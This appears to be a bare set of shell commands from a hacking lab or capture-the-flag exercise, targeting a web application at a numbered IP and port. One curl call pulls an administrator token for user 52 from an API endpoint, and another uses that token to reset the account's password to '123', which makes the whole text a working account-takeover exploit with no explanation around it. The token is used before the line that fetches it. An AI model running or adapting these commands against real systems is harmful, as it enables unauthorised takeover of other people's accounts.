  
  curl -v -X GET "http://94.237.55.43:50149/reset.php?uid=52&token=$ADMIN_TOKEN&password=123"
  
  ADMIN_TOKEN=$(curl -s "http://94.237.55.43:50149/api.php/token/52" | jq -r .token)
echo "Admin Token: $ADMIN_TOKEN"
